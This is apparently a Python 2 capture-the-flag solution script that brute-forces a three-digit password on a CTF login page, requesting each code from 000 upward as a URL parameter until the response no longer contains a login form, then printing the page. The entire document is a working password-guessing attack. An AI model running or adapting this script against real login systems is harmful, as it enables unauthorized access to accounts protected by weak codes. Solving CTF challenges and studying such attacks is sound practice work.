#!/usr/bin/env python
import urllib2

baseurl = "http://login3.uni.hctf.fun/?passwd="
for number in range(0, 999):
    pwd = "0"*(3-len(str(number))) + str(number)
    content = urllib2.urlopen(baseurl + pwd).read()
    if content.find("<input type") == -1:
        print content
        break
